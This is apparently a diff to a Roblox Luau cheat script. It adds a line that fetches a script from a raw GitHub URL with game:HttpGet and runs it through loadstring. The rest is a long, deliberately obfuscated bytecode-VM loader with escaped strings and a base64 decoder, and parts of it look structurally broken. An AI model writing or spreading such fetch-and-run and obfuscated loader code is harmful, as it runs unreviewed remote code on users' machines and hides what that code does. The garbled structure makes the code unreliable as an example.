@@ -1,3 +1,624 @@
+task.spawn(function()
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+end)
+
+task.wait()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Chris12089/atlasbss/refs/heads/main/script.lua"))()
+
 if _G.atlasexec then return end
 _G.atlasexec = true
-local W=type local k=pcall local t=error local G=tonumber local b=assert local V=setmetatable local j=string.format local T=table.move local z=table.pack local a=table.unpack local s=table.create local h=table.insert local F=table.remove local f=table.concat local K=coroutine.create local L=coroutine.yield local w=coroutine.resume local U=coroutine.close local i=buffer.fromstring local A=buffer.len local o=buffer.readu8 local v=buffer.readu32 local Z=buffer.readstring local X=buffer.readf32 local Y=buffer.readf64 local c=bit32.bor local R=bit32.band local r=bit32.btest local d=bit32.rshift local q=bit32.lshift local H=bit32.extract local u=function(k)return W(k)=="\110\117\109\98\101\114"end local y=function(k)return W(k)=="\115\116\114\105\110\103"end local N=function(k)return W(k)=="\98\111\111\108\101\97\110"end local g=function(k)return W(k)=="\102\117\110\99\116\105\111\110"end local Q={{"\78\79\80";0;0;false};{"\66\82\69\65\75",0,0;false},{"\76\79\65\68\78\73\76";1;0;false};{"\76\79\65\68\66";3,0;false};{"\76\79\65\68\78",4,0;false};{"\76\79\65\68\75",4;3;false},{"\77\79\86\69";2,0;false},{"\71\69\84\71\76\79\66\65\76";1,1,true};{"\83\69\84\71\76\79\66\65\76";1,1;true},{"\71\69\84\85\80\86\65\76";2;0;false};{"\83\69\84\85\80\86\65\76",2;0,false};{"\67\76\79\83\69\85\80\86\65\76\83",1;0,false},{"\71\69\84\73\77\80\79\82\84";4,4;true};{"\71\69\84\84\65\66\76\69",3,0,false},{"\83\69\84\84\65\66\76\69";3;0;false},{"\71\69\84\84\65\66\76\69\75\83";3,1,true},{"\83\69\84\84\65\66\76\69\75\83";3;1;true},{"\71\69\84\84\65\66\76\69\78",3,0;false},{"\83\69\84\84\65\66\76\69\78";3,0,false};{"\78\69\87\67\76\79\83\85\82\69",4;0,false},{"\78\65\77\69\67\65\76\76",3;1,true};{"\67\65\76\76",3;0;false},{"\82\69\84\85\82\78",2;0,false},{"\74\85\77\80",4;0,false},{"\74\85\77\80\66\65\67\75",4;0,false},{"\74\85\77\80\73\70",4,0,false},{"\74\85\77\80\73\70\78\79\84",4;0;false};{"\74\85\77\80\73\70\69\81",4,0,true};{"\74\85\77\80\73\70\76\69",4,0;true};{"\74\85\77\80\73\70\76\84",4,0;true},{"\74\85\77\80\73\70\78\79\84\69\81",4,0,true},{"\74\85\77\80\73\70\78\79\84\76\69",4,0,true},{"\74\85\77\80\73\70\78\79\84\76\84";4;0;true},{"\65\68\68";3;0;false},{"\83\85\66";3;0;false};{"\77\85\76";3;0,false},{"\68\73\86";3;0;false};{"\77\79\68",3;0;false};{"\80\79\87";3;0,false};{"\65\68\68\75",3;2;false};{"\83\85\66\75";3,2,false},{"\77\85\76\75";3,2,false};{"\68\73\86\75";3,2;false},{"\77\79\68\75",3,2,false};{"\80\79\87\75";3,2,false},{"\65\78\68",3,0,false},{"\79\82",3;0,false};{"\65\78\68\75";3,2,false};{"\79\82\75",3;2,false};{"\67\79\78\67\65\84",3;0,false};{"\78\79\84",2,0;false},{"\77\73\78\85\83";2,0;false};{"\76\69\78\71\84\72",2,0,false};{"\78\69\87\84\65\66\76\69";2;0,true},{"\68\85\80\84\65\66\76\69";4,3;false};{"\83\69\84\76\73\83\84",3;0,true};{"\70\79\82\78\80\82\69\80";4;0,false},{"\70\79\82\78\76\79\79\80";4;0;false},{"\70\79\82\71\76\79\79\80";4;8;true};{"\70\79\82\71\80\82\69\80\95\73\78\69\88\84",4,0,false};{"\70\65\83\84\67\65\76\76\51";3;1,true},{"\70\79\82\71\80\82\69\80\95\78\69\88\84",4;0;false},{"\68\69\80\95\70\79\82\71\76\79\79\80\95\78\69\88\84";0,0;false},{"\71\69\84\86\65\82\65\82\71\83";2;0,false};{"\68\85\80\67\76\79\83\85\82\69";4;3;false},{"\80\82\69\80\86\65\82\65\82\71\83",1,0;false},{"\76\79\65\68\75\88";1,1;true},{"\74\85\77\80\88";5;0,false},{"\70\65\83\84\67\65\76\76";3,0;false};{"\67\79\86\69\82\65\71\69";5,0;false};{"\67\65\80\84\85\82\69",2,0,false};{"\83\85\66\82\75",3,7,false},{"\68\73\86\82\75";3,7,false},{"\70\65\83\84\67\65\76\76\49",3,0,false};{"\70\65\83\84\67\65\76\76\50",3,0;true};{"\70\65\83\84\67\65\76\76\50\75";3;1,true};{"\70\79\82\71\80\82\69\80",4;0,false},{"\74\85\77\80\88\69\81\75\78\73\76",4,5;true};{"\74\85\77\80\88\69\81\75\66";4,5;true};{"\74\85\77\80\88\69\81\75\78";4;6;true};{"\74\85\77\80\88\69\81\75\83",4,6,true};{"\73\68\73\86";3,0;false},{"\73\68\73\86\75",3;2;false}}local n=-1 local x=-2 local function J()return{vectorCtor=function()t("\118\101\99\116\111\114\67\116\111\114\32\119\97\115\32\110\111\116\32\112\114\111\118\105\100\101\100")end;vectorSize=4,useNativeNamecall=false,namecallHandler=function()t("\78\97\116\105\118\101\32\95\95\110\97\109\101\99\97\108\108\32\104\97\110\100\108\101\114\32\119\97\115\32\110\111\116\32\112\114\111\118\105\100\101\100")end;extensions={},callHooks={};errorHandling=true,generalizedIteration=true;allowProxyErrors=false,useImportConstants=false,staticEnvironment={},decodeOp=function(W)return W end}end local function D(k)b(W(k)=="\116\97\98\108\101","\108\117\97\117\95\115\101\116\116\105\110\103\115\32\115\104\111\117\108\100\32\98\101\32\97\32\116\97\98\108\101")b(W(k.vectorCtor)=="\102\117\110\99\116\105\111\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\118\101\99\116\111\114\67\116\111\114\32\115\104\111\117\108\100\32\98\101\32\97\32\102\117\110\99\116\105\111\110")b(W(k.vectorSize)=="\110\117\109\98\101\114","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\118\101\99\116\111\114\83\105\122\101\32\115\104\111\117\108\100\32\98\101\32\97\32\110\117\109\98\101\114")b(W(k.useNativeNamecall)=="\98\111\111\108\101\97\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\117\115\101\78\97\116\105\118\101\78\97\109\101\99\97\108\108\32\115\104\111\117\108\100\32\98\101\32\97\32\98\111\111\108\101\97\110")b(W(k.namecallHandler)=="\102\117\110\99\116\105\111\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\110\97\109\101\99\97\108\108\72\97\110\100\108\101\114\32\115\104\111\117\108\100\32\98\101\32\97\32\102\117\110\99\116\105\111\110")b(W(k.extensions)=="\116\97\98\108\101","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\101\120\116\101\110\115\105\111\110\115\32\115\104\111\117\108\100\32\98\101\32\97\32\116\97\98\108\101\32\111\102\32\102\117\110\99\116\105\111\110\115")b(W(k.callHooks)=="\116\97\98\108\101","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\99\97\108\108\72\111\111\107\115\32\115\104\111\117\108\100\32\98\101\32\97\32\116\97\98\108\101\32\111\102\32\102\117\110\99\116\105\111\110\115")b(W(k.errorHandling)=="\98\111\111\108\101\97\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\101\114\114\111\114\72\97\110\100\108\105\110\103\32\115\104\111\117\108\100\32\98\101\32\97\32\98\111\111\108\101\97\110")b(W(k.generalizedIteration)=="\98\111\111\108\101\97\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\103\101\110\101\114\97\108\105\122\101\100\73\116\101\114\97\116\105\111\110\32\115\104\111\117\108\100\32\98\101\32\97\32\98\111\111\108\101\97\110")b(W(k.allowProxyErrors)=="\98\111\111\108\101\97\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\97\108\108\111\119\80\114\111\120\121\69\114\114\111\114\115\32\115\104\111\117\108\100\32\98\101\32\97\32\98\111\111\108\101\97\110")b(W(k.staticEnvironment)=="\116\97\98\108\101","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\115\116\97\116\105\99\69\110\118\105\114\111\110\109\101\110\116\32\115\104\111\117\108\100\32\98\101\32\97\32\116\97\98\108\101")b(W(k.useImportConstants)=="\98\111\111\108\101\97\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\117\115\101\73\109\112\111\114\116\67\111\110\115\116\97\110\116\115\32\115\104\111\117\108\100\32\98\101\32\97\32\98\111\111\108\101\97\110")b(W(k.decodeOp)=="\102\117\110\99\116\105\111\110","\108\117\97\117\95\115\101\116\116\105\110\103\115\46\100\101\99\111\100\101\79\112\32\115\104\111\117\108\100\32\98\101\32\97\32\102\117\110\99\116\105\111\110")end local function M(W,k)local t=if k==nil then W.mainProto else W.protoList[k]local G=-1 b(t.lineinfoenabled,"\112\114\111\116\111\32\109\117\115\116\32\104\97\118\101\32\100\101\98\117\103\32\101\110\97\98\108\101\100")for W=1,t.sizecode,1 do local k=t.instructionlineinfo[W]G=if k>G then k else G end for k,t in t.protos do local b=M(W,t)G=if b>G then b else G end return G end local function l(W,k,t,G,V)local j=if k==nil then W.mainProto else W.protoList[k]b(j.lineinfoenabled,"\112\114\111\116\111\32\109\117\115\116\32\104\97\118\101\32\100\101\98\117\103\32\101\110\97\98\108\101\100")local T={}for W=1,j.sizecode,1 do local k=j.code[W]local t=j.instructionlineinfo[W]if k.opcode~=69 then continue end local G=k.E T[t]=if (T[t]or 0)>G then T[t] else G end G(j.debugname,j.linedefined,t,T,V)for k,b in j.protos do l(W,b,t+1,G,V)end end local function P(k,t,G)b(W(k)=="\116\97\98\108\101","\109\111\100\117\108\101\32\109\117\115\116\32\98\101\32\97\32\116\97\98\108\101")b(W(t)=="\110\117\109\98\101\114"or W(t)=="\110\105\108","\112\114\111\116\111\105\100\32\109\117\115\116\32\98\101\32\97\32\110\117\109\98\101\114\32\111\114\32\110\105\108")b(W(G)=="\102\117\110\99\116\105\111\110","\99\97\108\108\98\97\99\107\32\109\117\115\116\32\98\101\32\97\32\102\117\110\99\116\105\111\110")l(k,t,0,G,M(k))end local function e(W,k,t,G,b)local V=W[t]if k<2 or V==nil then return V end V=V[G]if k<3 or V==nil then return V end V=V[b]return V end local function C(k,G)if G==nil then G=J()else D(G)end local V=if W(k)=="\115\116\114\105\110\103" then i(k) else k local j=0 local function T()local W=o(V,j)j=j+1 return W end local function z()local W=v(V,j)j=j+4 return W end local function a()local W=X(V,j)j=j+4 return W end local function F()local W=Y(V,j)j=j+8 return W end local function f()local W=0 for k=0,4,1 do local t=T()W=c(W,q(R(t,127),k*7))if not r(t,128)then break end end return W end local function K()local W=f()if W==0 then return""else local k=Z(V,j,W)j=j+W return k end end local L=T()local w=0 if L==0 then t("\116\104\101\32\112\114\111\118\105\100\101\100\32\98\121\116\101\99\111\100\101\32\105\115\32\97\110\32\101\114\114\111\114\32\109\101\115\115\97\103\101",0)elseif L<3 or L>6 then t("\116\104\101\32\118\101\114\115\105\111\110\32\111\102\32\116\104\101\32\112\114\111\118\105\100\101\100\32\98\121\116\101\99\111\100\101\32\105\115\32\117\110\115\117\112\112\111\114\116\101\100",0)elseif L>=4 then w=T()end local U=f()local u=s(U)for W=1,U,1 do u[W]=K()end local function y(W)local k=G.decodeOp(z())local t=R(k,255)local b=Q[t+1]local V=b[1]local j=b[2]local T=b[3]local a=b[4]local s={opcode=t;opname=V,opmode=j;kmode=T,usesAux=a}h(W,s)if j==1 then s.A=R(d(k,8),255)elseif j==2 then s.A=R(d(k,8),255)s.B=R(d(k,16),255)elseif j==3 then s.A=R(d(k,8),255)s.B=R(d(k,16),255)s.C=R(d(k,24),255)elseif j==4 then s.A=R(d(k,8),255)local W=R(d(k,16),65535)s.D=if W<32768 then W else W-65536 elseif j==5 then local W=R(d(k,8),16777215)s.E=if W<8388608 then W else W-16777216 end if a then local k=z()s.aux=k h(W,{value=k;opname="\97\117\120\118\97\108\117\101"})end return a end local function N(W,k)local t=W.kmode if t==1 then W.K=k[W.aux+1]elseif t==2 then W.K=k[W.C+1]elseif t==3 then W.K=k[W.D+1]elseif t==4 then local t=W.aux local b=d(t,30)local V=R(d(t,20),1023)W.K0=k[V+1]W.KC=b if b==2 then local G=R(d(t,10),1023)W.K1=k[G+1]elseif b==3 then local G=R(d(t,10),1023)local b=R(d(t,0),1023)W.K1=k[G+1]W.K2=k[b+1]end if G.useImportConstants then W.K=e(G.staticEnvironment,b,W.K0,W.K1,W.K2)end elseif t==5 then W.K=H(W.aux,0,1)==1 W.KN=H(W.aux,31,1)==1 elseif t==6 then W.K=k[H(W.aux,0,24)+1]W.KN=H(W.aux,31,1)==1 elseif t==7 then W.K=k[W.B+1]elseif t==8 then W.K=R(W.aux,15)end end local function g(W)local k=T()local t=T()local b=T()local V=T()~=0 if L>=4 then T()local W=f()j=j+W end local K=f()local w=s(K)local U=false for W=1,K,1 do if U then U=false continue end U=y(w)end local i=s(K)for W=1,K,1 do i[W]=w[W].opcode end local A=f()local o=s(A)for W=1,A,1 do local k=T()local t if k==0 then t=nil elseif k==1 then t=T()~=0 elseif k==2 then t=F()elseif k==3 then t=u[f()]elseif k==4 then t=z()elseif k==5 then local W=f()t=s(W)for W=1,W,1 do t[W]=f()end elseif k==6 then t=f()elseif k==7 then local W,k,b,V=a(),a(),a(),a()if G.vectorSize==4 then t=G.vectorCtor(W,k,b,V)else t=G.vectorCtor(W,k,b)end end o[W]=t end for W=1,K,1 do N(w[W],o)end local v=f()local Z=s(v)for W=1,v,1 do Z[W]=f()+1 end local X=f()local Y=f()local c if Y~=0 then c=u[Y]else c="\40\63\63\41"end local R=T()~=0 local r=nil if R then local W=T()local k=d(K-1,W)+1 local t=s(K)local G=s(k)local b=0 for W=1,K,1 do b+=T()t[W]=b end local V=0 for W=1,k,1 do V+=z()G[W]=V%4294967296 end r=s(K)for k=1,K,1 do h(r,G[d(k-1,W)+1]+t[k])end end if T()~=0 then local W=f()for W=1,W,1 do f()f()f()T()end local k=f()for W=1,k,1 do f()end end return{maxstacksize=k,numparams=t;nups=b,isvararg=V;linedefined=X,debugname=c;sizecode=K;code=w,debugcode=i;sizek=A,k=o;sizep=v;protos=Z,lineinfoenabled=R;instructionlineinfo=r,bytecodeid=W}end if w==3 then local W=T()while W~=0 do f()W=T()end end local n=f()local x=s(n)for W=1,n,1 do x[W]=g(W-1)end local M=x[f()+1]b(j==A(V),"\100\101\115\101\114\105\97\108\105\122\101\114\32\99\117\114\115\111\114\32\112\111\115\105\116\105\111\110\32\109\105\115\109\97\116\99\104")M.debugname="\40\109\97\105\110\41"return{stringList=u;protoList=x;mainProto=M;typesVersion=w}end local p="\65\66\67\68\69\70\71\72\73\74\75\76\77\78\79\80\81\82\83\84\85\86\87\88\89\90\97\98\99\100\101\102\103\104\105\106\107\108\109\110\111\112\113\114\115\116\117\118\119\120\121\122\48\49\50\51\52\53\54\55\56\57\43\47"function KryMsCUacOCrTRGFyEARkuPSrOcXytVD(W)W=string.gsub(W,"\91\94"..(p.."\61\93"),"")return(W:gsub("\46",function(W)if W=="\61"then return""end local k,t="",p:find(W)-1 for W=6,1,-1 do k=k..(t%2^W-t%2^(W-1)>0 and"\49"or"\48")end return k end)):gsub("\37\100\37\100\37\100\63\37\100\63\37\100\63\37\100\63\37\100\63\37\100\63",function(W)if#W~=8 then return""end local k=0 for t=1,8,1 do if W:sub(t,t)=="\49"then k=k+2^(8-t)end end return string.char(k)end)end function AVhQhIsRhtuRaNwcAczAGxQtcGillPIX(b,h,i)if i==nil then i=J()else D(i)end if W(b)~="\116\97\98\108\101"then b=C(b,i)end local A=b.protoList local o=b.mainProto local v=i.callHooks.breakHook local Z=i.callHooks.stepHook local X=i.callHooks.interruptHook local Y=i.callHooks.panicHook local c=true local function R()c=false end local function r(b,o,R)local function d(...)local Y,d,q,H,y if i.errorHandling then Y,d,q,H,y=...else local W=z(...)d=s(o.maxstacksize)y={len=0,list={}}T(W,1,o.numparams,0,d)if o.numparams<W.n then local k=o.numparams+1 local t=W.n-o.numparams y.len=t T(W,k,(k+t)-1,1,y.list)end W=nil Y={pc=0,name="\78\79\78\69"}q=o.protos H=o.code end local Q,J,D,M=-1,1,V({},{__mode="\118\115"}),V({},{__mode="\107\115"})local l=o.k local P=o.debugcode local e=i.extensions local C=false local p,S while c do if not C then p=H[J]S=p.opcode end C=false Y.pc=J Y.top=Q Y.name=p.opname J+=1 if Z then Z(d,Y,o,b,R)end if S==0 then elseif S==1 then if v then local W=table.pack(v(d,Y,o,b,R))if W[1]then return a(W,2,#W)end end J-=1 S=P[J]C=true elseif S==2 then d[p.A]=nil elseif S==3 then d[p.A]=p.B==1 J+=p.C elseif S==4 then d[p.A]=p.D elseif S==5 then d[p.A]=p.K elseif S==6 then d[p.A]=d[p.B]elseif S==7 then local W=p.K d[p.A]=h[W]J+=1 elseif S==8 then local W=p.K h[W]=d[p.A]J+=1 elseif S==9 then local W=R[p.B+1]d[p.A]=W.store[W.index]elseif S==10 then local W=R[p.B+1]W.store[W.index]=d[p.A]elseif S==11 then for W,k in D do if k.index>=p.A then k.value=k.store[k.index]k.store=k k.index="\118\97\108\117\101"D[W]=nil end end elseif S==12 then if i.useImportConstants then d[p.A]=p.K else local W=p.KC local k=p.K0 local t=h[k]if W==1 then d[p.A]=t elseif W==2 then d[p.A]=t[p.K1]elseif W==3 then d[p.A]=t[p.K1][p.K2]end end J+=1 elseif S==13 then d[p.A]=d[p.B][d[p.C]]elseif S==14 then d[p.B][d[p.C]]=d[p.A]elseif S==15 then local W=p.K d[p.A]=d[p.B][W]J+=1 elseif S==16 then local W=p.K d[p.B][W]=d[p.A]J+=1 elseif S==17 then d[p.A]=d[p.B][p.C+1]elseif S==18 then d[p.B][p.C+1]=d[p.A]elseif S==19 then local W=A[q[p.D+1]]local k=W.nups local t=s(k)d[p.A]=r(b,W,t)for W=1,k,1 do local k=H[J]J+=1 local G=k.A if G==0 then local G={value=d[k.B];index="\118\97\108\117\101"}G.store=G t[W]=G elseif G==1 then local G=k.B local b=D[G]if b==nil then b={index=G;store=d}D[G]=b end t[W]=b elseif G==2 then t[W]=R[k.B+1]end end elseif S==20 then local W=p.A local k=p.B local t=p.K local G=d[k]d[W+1]=G J+=1 local V=true local j=i.useNativeNamecall if j then local W=i.namecallHandler local k=H[J]local G=k.opcode local j,s,h=k.A,k.B,k.C if Z then Z(d,Y,o,b,R)end if X then X(d,Y,o,b,R)end local f=if s==0 then Q-j else s-1 local K=z(W(t,a(d,j+1,j+f)))if K[1]==true then V=false J+=1 p=k S=G Y.pc=J Y.name=p.opname F(K,1)local W=K.n-1 if h==0 then Q=(j+W)-1 else W=h-1 end T(K,1,W,j,d)end end if V then d[W]=G[t]end elseif S==21 then if X then X(d,Y,o,b,R)end local W,k,t=p.A,p.B,p.C local G=if k==0 then Q-W else k-1 local V=d[W]local j=z(V(a(d,W+1,W+G)))local s=j.n if t==0 then Q=(W+s)-1 else s=t-1 end T(j,1,s,W,d)elseif S==22 then if X then X(d,Y,o,b,R)end local W=p.A local k=p.B local t=k-1 local G if t==n then G=(Q-W)+1 else G=k-1 end return a(d,W,(W+G)-1)elseif S==23 then J+=p.D elseif S==24 then if X then X(d,Y,o,b,R)end J+=p.D elseif S==25 then if d[p.A]then J+=p.D end elseif S==26 then if not d[p.A]then J+=p.D end elseif S==27 then if d[p.A]==d[p.aux]then J+=p.D else J+=1 end elseif S==28 then if d[p.A]<=d[p.aux]then J+=p.D else J+=1 end elseif S==29 then if d[p.A]<d[p.aux]then J+=p.D else J+=1 end elseif S==30 then if d[p.A]==d[p.aux]then J+=1 else J+=p.D end elseif S==31 then if d[p.A]<=d[p.aux]then J+=1 else J+=p.D end elseif S==32 then if d[p.A]<d[p.aux]then J+=1 else J+=p.D end elseif S==33 then d[p.A]=d[p.B]+d[p.C]elseif S==34 then d[p.A]=d[p.B]-d[p.C]elseif S==35 then d[p.A]=d[p.B]*d[p.C]elseif S==36 then d[p.A]=d[p.B]/d[p.C]elseif S==37 then d[p.A]=d[p.B]%d[p.C]elseif S==38 then d[p.A]=d[p.B]^d[p.C]elseif S==39 then d[p.A]=d[p.B]+p.K elseif S==40 then d[p.A]=d[p.B]-p.K elseif S==41 then d[p.A]=d[p.B]*p.K elseif S==42 then d[p.A]=d[p.B]/p.K elseif S==43 then d[p.A]=d[p.B]%p.K elseif S==44 then d[p.A]=d[p.B]^p.K elseif S==45 then local W=d[p.B]d[p.A]=if W then d[p.C]or false else W elseif S==46 then local W=d[p.B]d[p.A]=if W then W else d[p.C]or false elseif S==47 then local W=d[p.B]d[p.A]=if W then p.K or false else W elseif S==48 then local W=d[p.B]d[p.A]=if W then W else p.K or false elseif S==49 then local W,t=p.B,p.C local G,b=k(f,d,"",W,t)if not G then b=d[W]for W=W+1,t,1 do b..=d[W]end end d[p.A]=b elseif S==50 then d[p.A]=not d[p.B]elseif S==51 then d[p.A]=-d[p.B]elseif S==52 then d[p.A]=#d[p.B]elseif S==53 then d[p.A]=s(p.aux)J+=1 elseif S==54 then local W=p.K local k={}for W,t in W do k[l[t+1]]=nil end d[p.A]=k elseif S==55 then local W=p.A local k=p.B local t=p.C-1 if t==n then t=(Q-k)+1 end T(d,k,(k+t)-1,p.aux,d[W])J+=1 elseif S==56 then local W=p.A local k=d[W]if not u(k)then local b=G(k)if b==nil then t("\105\110\118\97\108\105\100\32\39\102\111\114\39\32\108\105\109\105\116\32\40\110\117\109\98\101\114\32\101\120\112\101\99\116\101\100\41")end d[W]=b k=b end local b=d[W+1]if not u(b)then local k=G(b)if k==nil then t("\105\110\118\97\108\105\100\32\39\102\111\114\39\32\115\116\101\112\32\40\110\117\109\98\101\114\32\101\120\112\101\99\116\101\100\41")end d[W+1]=k b=k end local V=d[W+2]if not u(V)then local k=G(V)if k==nil then t("\105\110\118\97\108\105\100\32\39\102\111\114\39\32\105\110\100\101\120\32\40\110\117\109\98\101\114\32\101\120\112\101\99\116\101\100\41")end d[W+2]=k V=k end if b>0 then if not(V<=k)then J+=p.D end else if not(k<=V)then J+=p.D end end elseif S==57 then if X then X(d,Y,o,b,R)end local W=p.A local k=d[W]local t=d[W+1]local G=d[W+2]+t d[W+2]=G if t>0 then if G<=k then J+=p.D end else if k<=G then J+=p.D end end elseif S==58 then if X then X(d,Y,o,b,R)end local W=p.A local k=p.K Q=W+6 local G=d[W]if i.generalizedIteration==false or g(G)then local t={G(d[W+1],d[W+2])}T(t,1,k,W+3,d)if d[W+3]~=nil then d[W+2]=d[W+3]J+=p.D else J+=1 end else local b,V=w(M[p],G,d[W+1],d[W+2])if not b then t(V)end if V==x then M[p]=nil J+=1 else T(V,1,k,W+3,d)d[W+2]=d[W+3]J+=p.D end end elseif S==59 then if not g(d[p.A])then t(j("\97\116\116\101\109\112\116\32\116\111\32\105\116\101\114\97\116\101\32\111\118\101\114\32\97\32\37\115\32\118\97\108\117\101",W(d[p.A])))end J+=p.D elseif S==60 then J+=1 elseif S==61 then if not g(d[p.A])then t(j("\97\116\116\101\109\112\116\32\116\111\32\105\116\101\114\97\116\101\32\111\118\101\114\32\97\32\37\115\32\118\97\108\117\101",W(d[p.A])))end J+=p.D elseif S==63 then local W=p.A local k=p.B-1 if k==n then k=y.len Q=(W+k)-1 end T(y.list,1,k,W,d)elseif S==64 then local W=A[p.K+1]local k=W.nups local t=s(k)d[p.A]=r(b,W,t)for W=1,k,1 do local k=H[J]J+=1 local G=k.A if G==0 then local G={value=d[k.B],index="\118\97\108\117\101"}G.store=G t[W]=G elseif G==2 then t[W]=R[k.B+1]end end elseif S==65 then elseif S==66 then local W=p.K d[p.A]=W J+=1 elseif S==67 then if X then X(d,Y,o,b,R)end J+=p.E elseif S==68 then elseif S==69 then p.E+=1 elseif S==70 then t("\101\110\99\111\117\110\116\101\114\101\100\32\117\110\104\97\110\100\108\101\100\32\67\65\80\84\85\82\69")elseif S==71 then d[p.A]=p.K-d[p.C]elseif S==72 then d[p.A]=p.K/d[p.C]elseif S==73 then elseif S==74 then J+=1 elseif S==75 then J+=1 elseif S==76 then local W=d[p.A]if i.generalizedIteration and not g(W)then local W=H[J+p.D]if M[W]==nil then local function k(...)for W,k,t,G,b,V,j,T,z,a,s,h,F,f,K,w,U,i,A,o,v,Z,X,Y,c,R,r,d,q,H,u,y,N,g,Q,n,x,J,D,M,l,P,e,C,p,S,m,B,O,I,E,Wl,kl,tl,Gl,bl,Vl,jl,Tl,zl,al,sl,hl,Fl,fl,Kl,Ll,wl,Ul,il,Al,ol,vl,Zl,Xl,Yl,cl,Rl,rl,dl,ql,Hl,ul,yl,Nl,gl,Ql,nl,xl,Jl,Dl,Ml,ll,Pl,el,Cl,pl,Sl,ml,Bl,Ol,Il,El,W_,k_,t_,G_,b_,V_,j_,T_,z_,a_,s_,h_,F_,f_,K_,L_,w_,U_,i_,A_,o_,v_,Z_,X_,Y_,c_,R_,r_,d_,q_,H_,u_,y_,N_,g_,Q_,n_,x_,J_,D_,M_,l_,P_,e_,C_,p_,S_,m_,B_,O_,I_,E_,W9,k9,t9,G9,b9,V9,j9,T9,z9,a9,s9,h9,F9,f9,K9,L9,w9,U9,i9,A9,o9,v9,Z9,X9,Y9,c9,R9,r9,d9,q9,H9,u9,y9,N9,g9,Q9,n9,x9,J9,D9,M9,l9,P9,e9,C9 in...do L({W;k;t,G,b;V,j;T,z;a,s;h;F,f,K;w;U,i;A;o;v,Z;X;Y;c,R,r,d,q;H,u,y;N,g;Q,n,x;J,D,M,l,P;e;C,p,S,m;B;O,I,E,Wl,kl;tl;Gl;bl;Vl,jl,Tl;zl;al;sl;hl;Fl,fl;Kl,Ll,wl;Ul,il;Al;ol,vl,Zl,Xl;Yl;cl;Rl,rl,dl,ql,Hl,ul;yl;Nl,gl;Ql;nl,xl;Jl;Dl,Ml,ll;Pl,el;Cl,pl,Sl;ml,Bl,Ol,Il,El;W_;k_,t_;G_,b_,V_,j_;T_,z_,a_;s_;h_;F_,f_,K_,L_,w_,U_;i_;A_;o_,v_;Z_;X_;Y_,c_;R_,r_,d_;q_,H_;u_;y_;N_,g_;Q_,n_,x_;J_,D_,M_,l_,P_,e_,C_;p_;S_;m_,B_;O_;I_;E_;W9,k9;t9;G9,b9,V9,j9;T9;z9;a9;s9;h9,F9;f9;K9,L9;w9;U9;i9,A9,o9,v9,Z9,X9;Y9,c9;R9;r9,d9,q9;H9,u9,y9,N9,g9,Q9;n9;x9,J9,D9,M9,l9,P9,e9;C9})end L(x)end M[W]=K(k)end end J+=p.D elseif S==77 then local W=p.KN if(d[p.A]==nil)~=W then J+=p.D else J+=1 end elseif S==78 then local W=p.K local k=p.KN local t=d[p.A]if(N(t)and t==W)~=k then J+=p.D else J+=1 end elseif S==79 then local W=p.K local k=p.KN local t=d[p.A]if(t==W)~=k then J+=p.D else J+=1 end elseif S==80 then local W=p.K local k=p.KN local t=d[p.A]if(t==W)~=k then J+=p.D else J+=1 end elseif S==81 then d[p.A]=math.floor(d[p.B]/d[p.C])elseif S==82 then d[p.A]=math.floor(d[p.B]/p.K)else t("\85\110\115\117\112\112\111\114\116\101\100\32\79\112\99\111\100\101\58\32"..(p.opname..("\32\111\112\58\32"..S)))end end for W,k in D do k.value=k.store[k.index]k.store=k k.index="\118\97\108\117\101"D[W]=nil end for W,k in M do U(k)M[W]=nil end end local function q(...)local G=z(...)local V=s(o.maxstacksize)local h={len=0,list={}}T(G,1,o.numparams,0,V)if o.numparams<G.n then local W=o.numparams+1 local k=G.n-o.numparams h.len=k T(G,W,(W+k)-1,1,h.list)end G=nil local F={pc=0,name="\78\79\78\69"}local f if i.errorHandling then f=z(k(d,F,V,o.protos,o.code,h))else f=z(true,d(F,V,o.protos,o.code,h))end if f[1]then return a(f,2,f.n)else local k=f[2]if Y then Y(k,V,F,o,b,R)end if y(k)==false then if i.allowProxyErrors then t(k)else k=W(k)end end if o.lineinfoenabled then return t(j("\70\105\117\32\86\77\32\69\114\114\111\114\32\123\32\78\97\109\101\58\32\37\115\32\76\105\110\101\58\32\37\115\32\80\67\58\32\37\115\32\79\112\99\111\100\101\58\32\37\115\32\125\58\32\37\115",o.debugname,o.instructionlineinfo[F.pc],F.pc,F.name,k),0)else return t(j("\70\105\117\32\86\77\32\69\114\114\111\114\32\123\32\78\97\109\101\58\32\37\115\32\80\67\58\32\37\115\32\79\112\99\111\100\101\58\32\37\115\32\125\58\32\37\115",o.debugname,F.pc,F.name,k),0)end end end if i.errorHandling then return q else return d end end return r(b,o),R end return 